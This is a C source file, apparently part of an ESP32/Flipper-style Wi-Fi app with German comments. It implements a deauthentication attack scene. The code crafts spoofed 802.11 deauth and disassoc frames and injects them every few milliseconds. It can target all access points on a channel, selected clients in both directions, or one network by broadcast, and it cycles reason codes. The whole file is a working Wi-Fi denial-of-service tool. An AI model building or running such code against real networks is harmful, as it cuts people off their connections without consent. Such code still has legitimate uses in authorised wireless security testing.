#include "../wlan_app.h"
#include "../wlan_hal.h"
#include <esp_log.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

#define DEAUTH_TAG "WlanDeauth"
#define DEAUTH_CHANNEL_MIN 1
#define DEAUTH_CHANNEL_MAX 13
#define DEAUTH_TX_PERIOD_MS 5
#define DEAUTH_CH_MAX_APS 8
#define DEAUTH_CH_CACHE_TTL_MS 30000  // 30 s — APs auf dem Channel können wandern
#define DEAUTH_STATUS_TTL_TICKS 12    // ~3 s bei 250 ms Tick

static const uint8_t deauth_tmpl[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // addr1 RA
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr2 TA
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr3 BSSID
    0x00, 0x00, 0x02, 0x00,             // SeqCtl=0 (HW füllt via en_sys_seq), reason
};
static const uint8_t deauth_reasons[] = {0x01, 0x04, 0x06, 0x07, 0x08};
static const uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

static bool s_ok_held;

// Worker-State (xTaskCreate, NICHT FuriThread → darf esp_wifi_* direkt aufrufen).
static volatile TaskHandle_t s_task = NULL;
static volatile bool s_task_run = false;
static volatile uint32_t s_frames_sent = 0;

// Status-Synchronisation Worker → GUI (gepollt im Tick-Handler).
typedef enum {
    DeauthStatusIdle,
    DeauthStatusScanning,
    DeauthStatusNoApsOnChannel,
    DeauthStatusRunning,
} DeauthStatus;
static volatile DeauthStatus s_status = DeauthStatusIdle;
static uint8_t s_status_ttl = 0; // GUI-seitige Anzeige-Dauer für transienten Status

// Targeting-State (aus on_enter / Picker / AP-Scan befüllt).
static bool s_use_channel_mode = false;
static uint8_t s_target_bssid[6];
static uint8_t s_target_channel = 1;
static uint8_t s_unicast_macs[WLAN_APP_MAX_DEAUTH_CLIENTS][6];
static uint8_t s_unicast_count = 0;
static uint8_t s_ch_bssids[DEAUTH_CH_MAX_APS][6];
static uint8_t s_ch_bssid_count = 0;
static int8_t s_ch_scanned_channel = -1;
static uint32_t s_ch_scanned_at_ms = 0;

static inline uint32_t now_ms(void) {
    return (uint32_t)(furi_get_tick() * 1000U / furi_kernel_get_tick_frequency());
}

static void deauth_tx_pair(const uint8_t* ra, const uint8_t* ta_bssid, uint8_t reason) {
    uint8_t f[26];
    memcpy(f, deauth_tmpl, 26);
    memcpy(&f[4], ra, 6);
    memcpy(&f[10], ta_bssid, 6);
    memcpy(&f[16], ta_bssid, 6);
    f[24] = reason;
    if(esp_wifi_80211_tx(WIFI_IF_STA, f, 26, true) == ESP_OK) s_frames_sent++;
    f[0] = 0xa0; // Disassoc subtype
    if(esp_wifi_80211_tx(WIFI_IF_STA, f, 26, true) == ESP_OK) s_frames_sent++;
}

// Synchroner AP-Scan auf dem aktuellen Channel. Cached über Channel mit TTL.
// Aufruf nur aus dem Worker-xTask, NICHT aus dem GUI-Thread.
static void deauth_scan_channel_aps(uint8_t channel) {
    uint32_t now = now_ms();
    if(s_ch_scanned_channel == (int8_t)channel && s_ch_bssid_count > 0 &&
       (now - s_ch_scanned_at_ms) < DEAUTH_CH_CACHE_TTL_MS) {
        return;
    }
    s_ch_bssid_count = 0;
    s_status = DeauthStatusScanning;

    // Promiscuous muss off sein, damit die internen Scan-Hops funktionieren.
    wlan_hal_set_promiscuous(false, NULL);

    wifi_ap_record_t* recs = NULL;
    uint16_t count = 0;
    wlan_hal_scan(&recs, &count, 32);

    for(uint16_t i = 0; i < count && s_ch_bssid_count < DEAUTH_CH_MAX_APS; ++i) {
        if(recs[i].primary == channel) {
            memcpy(s_ch_bssids[s_ch_bssid_count], recs[i].bssid, 6);
            s_ch_bssid_count++;
        }
    }
    if(recs) free(recs);

    s_ch_scanned_channel = (int8_t)channel;
    s_ch_scanned_at_ms = now;
    ESP_LOGI(DEAUTH_TAG, "channel %u: found %u APs", (unsigned)channel,
        (unsigned)s_ch_bssid_count);
}

static void deauth_task_fn(void* arg) {
    UNUSED(arg);
    uint32_t cycle = 0;

    // Disconnect aus dem Worker — wlan_hal_disconnect ist sync mit
    // furi_delay_ms-Polling, würde im GUI-Thread spürbar hängen.
    if(wlan_hal_is_connected()) wlan_hal_disconnect();

    if(s_use_channel_mode) {
        deauth_scan_channel_aps(s_target_channel);
        if(s_ch_bssid_count == 0) {
            // Kein Target → promisc wieder einschalten, damit der nächste
            // Versuch nicht in inkonsistentem State landet.
            wlan_hal_set_promiscuous(true, NULL);
            s_status = DeauthStatusNoApsOnChannel;
            s_task_run = false;
            s_task = NULL;
            vTaskDelete(NULL);
            return;
        }
    }

    wlan_hal_set_channel(s_target_channel);
    wlan_hal_set_promiscuous(true, NULL);
    s_status = DeauthStatusRunning;

    while(s_task_run) {
        uint8_t reason = deauth_reasons[cycle % sizeof(deauth_reasons)];

        if(s_use_channel_mode) {
            const uint8_t* bssid = s_ch_bssids[cycle % s_ch_bssid_count];
            deauth_tx_pair(broadcast_mac, bssid, reason);
        } else if(s_unicast_count > 0) {
            const uint8_t* sta = s_unicast_macs[cycle % s_unicast_count];
            // AP→STA: STA wirft Verbindung weg.
            deauth_tx_pair(sta, s_target_bssid, reason);
            // STA→AP: manche APs reagieren nur auf diese Richtung. Adress-Layout
            //  RA=AP, TA=STA, BSSID=AP.
            uint8_t f[26];
            memcpy(f, deauth_tmpl, 26);
            memcpy(&f[4], s_target_bssid, 6);
            memcpy(&f[10], sta, 6);
            memcpy(&f[16], s_target_bssid, 6);
            f[24] = reason;
            if(esp_wifi_80211_tx(WIFI_IF_STA, f, 26, true) == ESP_OK) s_frames_sent++;
            f[0] = 0xa0;
            if(esp_wifi_80211_tx(WIFI_IF_STA, f, 26, true) == ESP_OK) s_frames_sent++;
        } else {
            deauth_tx_pair(broadcast_mac, s_target_bssid, reason);
        }

        cycle++;
        vTaskDelay(pdMS_TO_TICKS(DEAUTH_TX_PERIOD_MS));
    }

    s_status = DeauthStatusIdle;
    s_task = NULL;
    vTaskDelete(NULL);
}

static void deauth_collect_unicast_targets(WlanApp* app) {
    s_unicast_count = 0;
    for(uint8_t i = 0; i < app->deauth_client_count &&
                       s_unicast_count < WLAN_APP_MAX_DEAUTH_CLIENTS; ++i) {
        if(app->deauth_clients[i].cut) {
            memcpy(s_unicast_macs[s_unicast_count], app->deauth_clients[i].mac, 6);
            s_unicast_count++;
        }
    }
}

static void deauth_apply_target(WlanApp* app) {
    WlanDeautherModel* m = view_get_model(app->view_deauther);
    memset(m, 0, sizeof(*m));

    if(app->channel_mode_active) {
        if(app->channel_action_channel < DEAUTH_CHANNEL_MIN ||
           app->channel_action_channel > DEAUTH_CHANNEL_MAX) {
            app->channel_action_channel = DEAUTH_CHANNEL_MIN;
        }
        s_use_channel_mode = true;
        s_target_channel = app->channel_action_channel;
        m->channel = app->channel_action_channel;
        strncpy(m->title, "Channel deauth", sizeof(m->title) - 1);
        strncpy(m->ssid, "(channel mode)", sizeof(m->ssid) - 1);
        m->channel_mode = true;
        // Channel-Mode macht ausschließlich Channel-Broadcast über alle gefundenen
        // APs — Picker-Selektionen sind hier ohne Effekt, also auch keine
        // Target-Counter-Anzeige.
        m->target_count = 0;
        // Auto-Mode wird im Channel-Mode nicht unterstützt → frischer Start.
        app->deauth_auto = false;
        m->auto_mode = false;
        m->running = false;
        view_commit_model(app->view_deauther, true);
        return;
    }

    s_use_channel_mode = false;
    const WlanApRecord* src = NULL;
    if(app->target_ap.ssid[0]) src = &app->target_ap;
    else if(app->connected) src = &app->connected_ap;

    if(src) {
        strncpy(m->ssid, src->ssid, sizeof(m->ssid) - 1);
        memcpy(m->bssid, src->bssid, sizeof(m->bssid));
        m->channel = src->channel ? src->channel : 1;
        memcpy(s_target_bssid, src->bssid, 6);
        s_target_channel = src->channel ? src->channel : 1;
    } else {
        strncpy(m->ssid, "(no target)", sizeof(m->ssid) - 1);
        m->channel = 1;
        memset(s_target_bssid, 0, 6);
        s_target_channel = 1;
    }
    deauth_collect_unicast_targets(app);

    const char* title = wlan_app_picker_has_selection(app) ? "Target deauth" : "Network deauth";
    strncpy(m->title, title, sizeof(m->title) - 1);
    m->channel_mode = false;
    m->target_count = wlan_app_picker_selection_count(app);
    m->auto_mode = app->deauth_auto;
    m->running = app->deauth_auto;
    view_commit_model(app->view_deauther, true);
}

// Setzt eine transient anzeigbare Statusmeldung im Model (3-s-Auto-Clear).
static void deauth_set_status_msg(WlanApp* app, const char* msg) {
    WlanDeautherModel* m = view_get_model(app->view_deauther);
    strncpy(m->status_msg, msg, sizeof(m->status_msg) - 1);
    m->status_msg[sizeof(m->status_msg) - 1] = '\0';
    view_commit_model(app->view_deauther, true);
    s_status_ttl = DEAUTH_STATUS_TTL_TICKS;
}

// Prüft Pre-Conditions, startet den Worker-xTask und liefert true wenn ein
// Worker läuft. Bei false → keine Mutation am Wifi-State, GUI muss UI-State
// zurückrollen.
static bool deauth_worker_start(WlanApp* app) {
    if(s_task_run || s_task) return true; // schon aktiv

    if(s_use_channel_mode) {
        if(s_target_channel < DEAUTH_CHANNEL_MIN || s_target_channel > DEAUTH_CHANNEL_MAX) {
            ESP_LOGW(DEAUTH_TAG, "channel-mode start: invalid channel %u",
                (unsigned)s_target_channel);
            return false;
        }
        // Scan passiert im Worker-Task — GUI bleibt responsive.
    } else {
        bool has_bssid = false;
        for(int i = 0; i < 6; i++) if(s_target_bssid[i]) { has_bssid = true; break; }
        if(!has_bssid) {
            ESP_LOGW(DEAUTH_TAG, "ssid-mode start: no target BSSID");
            return false;
        }
    }

    if(!wlan_hal_is_started()) {
        if(!wlan_hal_start()) return false;
    }
    // Disconnect macht der Worker selbst — siehe deauth_task_fn.

    s_frames_sent = 0;
    s_status = DeauthStatusScanning; // bleibt bis Worker tatsächlich umschaltet
    s_task_run = true;
    BaseType_t rc = xTaskCreate(deauth_task_fn, "WlanDeauth",
        4096, app, 5, (TaskHandle_t*)&s_task);
    if(rc != pdPASS) {
        s_task_run = false;
        s_task = NULL;
        s_status = DeauthStatusIdle;
        ESP_LOGE(DEAUTH_TAG, "xTaskCreate failed");
        return false;
    }
    ESP_LOGI(DEAUTH_TAG, "worker started (channel_mode=%d unicast=%u)",
        (int)s_use_channel_mode, (unsigned)s_unicast_count);
    return true;
}

static void deauth_worker_stop(void) {
    if(!s_task_run && !s_task) return;
    s_task_run = false;
    // Task beendet sich selbst (vTaskDelete im Task). Auf Beendigung warten.
    while(s_task) vTaskDelay(pdMS_TO_TICKS(10));
    ESP_LOGI(DEAUTH_TAG, "worker stopped, frames=%lu", (unsigned long)s_frames_sent);
}

// Channel im Channel-Mode um delta (±1) verschieben mit Wraparound, Worker
// stoppen, AP-Cache invalidieren und ggf. neu starten wenn OK noch gehalten.
static void deauth_channel_advance(WlanApp* app, int delta) {
    if(delta > 0) {
        if(app->channel_action_channel >= DEAUTH_CHANNEL_MAX) {
            app->channel_action_channel = DEAUTH_CHANNEL_MIN;
        } else {
            app->channel_action_channel++;
        }
    } else {
        if(app->channel_action_channel <= DEAUTH_CHANNEL_MIN) {
            app->channel_action_channel = DEAUTH_CHANNEL_MAX;
        } else {
            app->channel_action_channel--;
        }
    }
    WlanDeautherModel* m = view_get_model(app->view_deauther);
    m->channel = app->channel_action_channel;
    view_commit_model(app->view_deauther, true);
    deauth_worker_stop();
    s_ch_scanned_channel = -1;
    s_ch_bssid_count = 0;
    s_target_channel = app->channel_action_channel;
    m = view_get_model(app->view_deauther);
    m->running = false;
    m->status_msg[0] = '\0';
    s_status_ttl = 0;
    view_commit_model(app->view_deauther, true);
    if(s_ok_held) {
        if(deauth_worker_start(app)) {
            m = view_get_model(app->view_deauther);
            m->running = true;
            view_commit_model(app->view_deauther, true);
        } else {
            deauth_set_status_msg(app, "Invalid channel");
        }
    }
}

void wlan_app_scene_network_deauth_on_enter(void* context) {
    WlanApp* app = context;
    s_ok_held = false;
    s_frames_sent = 0;
    s_ch_scanned_channel = -1;
    s_ch_bssid_count = 0;
    s_status = DeauthStatusIdle;
    s_status_ttl = 0;
    deauth_apply_target(app);

    // Auto-Mode war vor dem Verlassen aktiv? Dann sofort weiter.
    WlanDeautherModel* m = view_get_model(app->view_deauther);
    bool should_run = m->running;
    view_commit_model(app->view_deauther, false);
    if(should_run) {
        if(!deauth_worker_start(app)) {
            // SSID-Mode mit Auto und kein BSSID — Auto wieder ausschalten.
            WlanDeautherModel* m2 = view_get_model(app->view_deauther);
            m2->running = false;
            m2->auto_mode = false;
            view_commit_model(app->view_deauther, true);
            app->deauth_auto = false;
            deauth_set_status_msg(app, "No target");
        }
    }

    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewDeauther);
}

bool wlan_app_scene_network_deauth_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom) {
        WlanDeautherModel* m = view_get_model(app->view_deauther);
        if(event.event == WlanAppCustomEventDeautherStart) {
            s_ok_held = true;
            bool ok = deauth_worker_start(app);
            if(ok) {
                m->running = true;
                m->status_msg[0] = '\0'; // alte Status-Anzeige clearen
                s_status_ttl = 0;
            } else {
                m->running = false;
                deauth_set_status_msg(app, s_use_channel_mode ?
                    "Invalid channel" : "No target");
            }
            view_commit_model(app->view_deauther, true);
            consumed = true;
        } else if(event.event == WlanAppCustomEventDeautherStop) {
            s_ok_held = false;
            bool keep = m->auto_mode;
            m->running = keep;
            view_commit_model(app->view_deauther, true);
            if(!keep) deauth_worker_stop();
            consumed = true;
        } else if(event.event == WlanAppCustomEventDeautherAuto) {
            // Down: Channel-Mode = Channel +1, sonst Auto/Stop-Toggle.
            if(app->channel_mode_active) {
                view_commit_model(app->view_deauther, false);
                deauth_channel_advance(app, +1);
            } else {
                m->auto_mode = !m->auto_mode;
                app->deauth_auto = m->auto_mode;
                bool want_run = m->auto_mode || s_ok_held;
                if(want_run) {
                    bool ok = deauth_worker_start(app);
                    if(ok) {
                        m->running = true;
                        m->status_msg[0] = '\0';
                        s_status_ttl = 0;
                    } else {
                        m->running = false;
                        m->auto_mode = false;
                        app->deauth_auto = false;
                        deauth_set_status_msg(app, "No target");
                    }
                } else {
                    m->running = false;
                    deauth_worker_stop();
                }
                view_commit_model(app->view_deauther, true);
            }
            consumed = true;
        } else if(event.event == WlanAppCustomEventDeautherTargets) {
            // Up: Channel-Mode = Channel -1, sonst Picker öffnen.
            if(app->channel_mode_active) {
                view_commit_model(app->view_deauther, false);
                deauth_channel_advance(app, -1);
                consumed = true;
            } else {
                deauth_worker_stop();
                m->auto_mode = false;
                m->running = false;
                app->deauth_auto = false;
                view_commit_model(app->view_deauther, true);
                scene_manager_next_scene(app->scene_manager, WlanAppSceneClientPicker);
                consumed = true;
            }
        } else {
            view_commit_model(app->view_deauther, false);
        }
    } else if(event.type == SceneManagerEventTypeTick) {
        WlanDeautherModel* m = view_get_model(app->view_deauther);
        m->frames_sent = s_frames_sent;
        // Worker-Status spiegeln.
        DeauthStatus st = s_status;
        m->scanning = (st == DeauthStatusScanning);
        if(st == DeauthStatusNoApsOnChannel && m->status_msg[0] == '\0') {
            // Worker ist mit "no APs" abgebrochen → einmalig in den Status
            // übernehmen und Worker-Flag konsumieren. Auto/ok_held auch
            // resetten — sonst bleibt running=true sichtbar, obwohl der
            // Worker tot ist und frames_sent eingefroren bleibt.
            strncpy(m->status_msg, "No APs on channel", sizeof(m->status_msg) - 1);
            m->status_msg[sizeof(m->status_msg) - 1] = '\0';
            s_status_ttl = DEAUTH_STATUS_TTL_TICKS;
            m->running = false;
            m->auto_mode = false;
            app->deauth_auto = false;
            s_ok_held = false;
            s_status = DeauthStatusIdle;
        }
        // Status-Auto-Clear nach TTL.
        if(s_status_ttl > 0) {
            s_status_ttl--;
            if(s_status_ttl == 0) m->status_msg[0] = '\0';
        }
        view_commit_model(app->view_deauther, true);
    }

    return consumed;
}

void wlan_app_scene_network_deauth_on_exit(void* context) {
    UNUSED(context);
    deauth_worker_stop();
    wlan_hal_set_promiscuous(false, NULL);
    s_ok_held = false;
    s_frames_sent = 0;
    s_ch_bssid_count = 0;
    s_ch_scanned_channel = -1;
    s_unicast_count = 0;
    s_status = DeauthStatusIdle;
    s_status_ttl = 0;
}
